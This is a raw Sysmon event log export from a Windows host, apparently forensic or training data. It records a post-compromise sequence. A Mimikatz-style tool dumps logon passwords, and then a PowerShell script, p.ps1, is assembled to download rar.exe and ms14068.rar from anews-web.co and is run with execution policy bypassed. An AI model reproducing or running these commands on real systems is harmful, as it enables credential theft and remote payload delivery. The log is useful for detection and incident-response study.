情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:45.760
ProcessGuid: {CC41BF7E-51E9-5A01-0000-0010EA3B2100}
ProcessId: 620
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:3760 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-51E9-5A01-0000-0010B0302100}
ParentProcessId: 3760
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:25:45.617
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:45.606
ProcessGuid: {CC41BF7E-51E9-5A01-0000-0010B0302100}
ProcessId: 3760
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:45.382
ProcessGuid: {CC41BF7E-51E9-5A01-0000-001057202100}
ProcessId: 5276
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:45.353
ProcessGuid: {CC41BF7E-51E9-5A01-0000-001057202100}
ProcessId: 5276
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 34166B8C-919A-5776-753B-64E95AA0C93B 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:45.304
ProcessGuid: {CC41BF7E-51E7-5A01-0000-0010C1F72000}
ProcessId: 2700
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:45.304
ProcessGuid: {CC41BF7E-51E7-5A01-0000-001050F72000}
ProcessId: 2808
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:45.289
ProcessGuid: {CC41BF7E-51E7-5A01-0000-0010C5F92000}
ProcessId: 2432
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
情報,2019/11/07 15:25:44,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:44.444
ProcessGuid: {CC41BF7E-51E8-5A01-0000-0010D5172100}
ProcessId: 4664
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:25:44,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:44.417
ProcessGuid: {CC41BF7E-51E8-5A01-0000-0010D5172100}
ProcessId: 4664
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey C98122A6-1C72-7A6A-C447-C242D3BA02D7 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:25:44,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:44.162
ProcessGuid: {CC41BF7E-51E8-5A01-0000-00109A132100}
ProcessId: 5236
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:25:44,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:44.128
ProcessGuid: {CC41BF7E-51E8-5A01-0000-00109A132100}
ProcessId: 5236
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 22422416-5D5E-71EE-54D5-D656551D4470 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:25:43,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:43.392
ProcessGuid: {CC41BF7E-51E7-5A01-0000-0010C5F92000}
ProcessId: 2432
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell  -ExecutionPolicy ByPass -File C:\Intel\Logs\p.ps1
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A9D3B2DED5EC2DA6C8F48F795437469961D3A225
ParentProcessGuid: {CC41BF7E-51E7-5A01-0000-001050F72000}
ParentProcessId: 2808
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\p.ps1"""
情報,2019/11/07 15:25:43,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:43.345
ProcessGuid: {CC41BF7E-51E7-5A01-0000-0010C1F72000}
ProcessId: 2700
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-51E7-5A01-0000-001050F72000}
ParentProcessId: 2808
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\p.ps1"""
情報,2019/11/07 15:25:43,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:43.339
ProcessGuid: {CC41BF7E-51E7-5A01-0000-001050F72000}
ProcessId: 2808
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\p.ps1""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:25:19,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:19.356
ProcessGuid: {CC41BF7E-51CF-5A01-0000-001078F32000}
ProcessId: 4088
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:25:19,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:19.340
ProcessGuid: {CC41BF7E-51CF-5A01-0000-001007F32000}
ProcessId: 6052
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:25:19,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:19.305
ProcessGuid: {CC41BF7E-51CF-5A01-0000-001078F32000}
ProcessId: 4088
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-51CF-5A01-0000-001007F32000}
ParentProcessId: 6052
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/ms14068.rar"", ""C:\Intel\Logs\ms14068.rar"") >> C:\Intel\Logs\p.ps1"""
情報,2019/11/07 15:25:19,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:19.299
ProcessGuid: {CC41BF7E-51CF-5A01-0000-001007F32000}
ProcessId: 6052
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/ms14068.rar"", ""C:\Intel\Logs\ms14068.rar"") >> C:\Intel\Logs\p.ps1""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:24:58,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:58.256
ProcessGuid: {CC41BF7E-51BA-5A01-0000-001068E42000}
ProcessId: 5732
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:24:58,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:58.240
ProcessGuid: {CC41BF7E-51BA-5A01-0000-0010F7E32000}
ProcessId: 276
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:24:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:24:58.204
ProcessGuid: {CC41BF7E-51BA-5A01-0000-001068E42000}
ProcessId: 5732
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-51BA-5A01-0000-0010F7E32000}
ParentProcessId: 276
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/rar.exe"", ""C:\Intel\Logs\rar.exe"") >> C:\Intel\Logs\p.ps1"""
情報,2019/11/07 15:24:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:24:58.199
ProcessGuid: {CC41BF7E-51BA-5A01-0000-0010F7E32000}
ProcessId: 276
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/rar.exe"", ""C:\Intel\Logs\rar.exe"") >> C:\Intel\Logs\p.ps1""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:24:50,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:50.905
ProcessGuid: {CC41BF7E-51B2-5A01-0000-0010B7D82000}
ProcessId: 5492
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:24:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:24:50.806
ProcessGuid: {CC41BF7E-51B2-5A01-0000-0010B7D82000}
ProcessId: 5492
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:24:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:37.156
ProcessGuid: {CC41BF7E-51A5-5A01-0000-001063CC2000}
ProcessId: 4456
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:24:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:37.156
ProcessGuid: {CC41BF7E-51A5-5A01-0000-0010F2CB2000}
ProcessId: 5340
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:24:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:24:37.120
ProcessGuid: {CC41BF7E-51A5-5A01-0000-001063CC2000}
ProcessId: 4456
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-51A5-5A01-0000-0010F2CB2000}
ParentProcessId: 5340
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\p.ps1"""
情報,2019/11/07 15:24:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:24:37.115
ProcessGuid: {CC41BF7E-51A5-5A01-0000-0010F2CB2000}
ProcessId: 5340
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\p.ps1""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:24:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:35.889
ProcessGuid: {CC41BF7E-51A3-5A01-0000-001074BA2000}
ProcessId: 4492
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:24:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:24:35.792
ProcessGuid: {CC41BF7E-51A3-5A01-0000-001074BA2000}
ProcessId: 4492
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:24:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:16.072
ProcessGuid: {CC41BF7E-5190-5A01-0000-001061AE2000}
ProcessId: 5716
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:24:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:16.072
ProcessGuid: {CC41BF7E-5190-5A01-0000-0010F0AD2000}
ProcessId: 3364
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:24:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"ソース ""Microsoft-Windows-Sysmon"" からのイベント ID 1 の説明が見つかりません。このイベントを発生させるコンポーネントがローカル コンピューターにインストールされていないか、インストールが壊れています。ローカル コンピューターにコンポーネントをインストールするか、コンポーネントを修復してください。

イベントが別のコンピューターから発生している場合、イベントと共に表示情報を保存する必要があります。

イベントには次の情報が含まれています: 

2019-11-07 06:24:16.022
EV_RenderedValue_1.00
5716
C:\Windows\System32\conhost.exe
\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
C:\Windows
EXAMPLE\maebashi.gunma
EV_RenderedValue_7.00
195377
1
Medium
SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
EV_RenderedValue_12.00
3364
C:\Windows\SysWOW64\cmd.exe
cmd /c ""type C:\Intel\Logs\c.txt""

ハンドルが無効です。
"
情報,2019/11/07 15:24:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:24:16.016
ProcessGuid: {CC41BF7E-5190-5A01-0000-0010F0AD2000}
ProcessId: 3364
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""type C:\Intel\Logs\c.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:24:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:02.386
ProcessGuid: {CC41BF7E-5176-5A01-0000-001067652000}
ProcessId: 5168
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:24:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:24:02.355
ProcessGuid: {CC41BF7E-5176-5A01-0000-0010E46F2000}
ProcessId: 4448
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:24:01,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:24:01.901
ProcessGuid: {CC41BF7E-4CD1-5A01-0000-0010EF070100}
ProcessId: 96
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:24:00,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:24:00.478
ProcessGuid: {CC41BF7E-4CD1-5A01-0000-0010EF070100}
ProcessId: 96
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:23:59,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:23:59.102
ProcessGuid: {CC41BF7E-4CD1-5A01-0000-0010EF070100}
ProcessId: 96
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:23:58,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:23:58.664
ProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ProcessId: 900
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\ProgramData\USOPrivate\UpdateStore\updatestoretemp51b519d5-b6f5-4333-8df6-e74d7c9aead4.xml
CreationUtcTime: 2019-12-14 17:33:55.212
PreviousCreationUtcTime: 2019-11-07 06:23:58.632"
情報,2019/11/07 15:23:56,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:23:56.943
ProcessGuid: {CC41BF7E-5040-5A01-0000-0010DD4A1C00}
ProcessId: 4308
Image: C:\Windows\System32\wbem\WmiPrvSE.exe"
情報,2019/11/07 15:23:56,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:23:56.552
ProcessGuid: {CC41BF7E-4CD1-5A01-0000-0010EF070100}
ProcessId: 96
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:23:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:23:55.066
ProcessGuid: {CC41BF7E-517A-5A01-0000-0010FA972000}
ProcessId: 5756
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:23:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:23:55.066
ProcessGuid: {CC41BF7E-517A-5A01-0000-001080972000}
ProcessId: 6020
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:23:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:23:55.066
ProcessGuid: {CC41BF7E-517B-5A01-0000-0010CF992000}
ProcessId: 5808
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 15:23:55,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:23:55.019
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:23:55,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:23:55.019
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:23:55,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:23:55.027
ProcessGuid: {CC41BF7E-517B-5A01-0000-0010CF992000}
ProcessId: 5808
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""privilege::debug"" ""sekurlsa::logonpasswords"" exit 
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {CC41BF7E-517A-5A01-0000-001080972000}
ParentProcessId: 6020
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit > C:\Intel\Logs\c.txt"""
情報,2019/11/07 15:23:54,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:23:54.987
ProcessGuid: {CC41BF7E-517A-5A01-0000-0010FA972000}
ProcessId: 5756
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-517A-5A01-0000-001080972000}
ParentProcessId: 6020
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit > C:\Intel\Logs\c.txt"""
情報,2019/11/07 15:23:54,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:23:54.979
ProcessGuid: {CC41BF7E-517A-5A01-0000-001080972000}
ProcessId: 6020
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit > C:\Intel\Logs\c.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
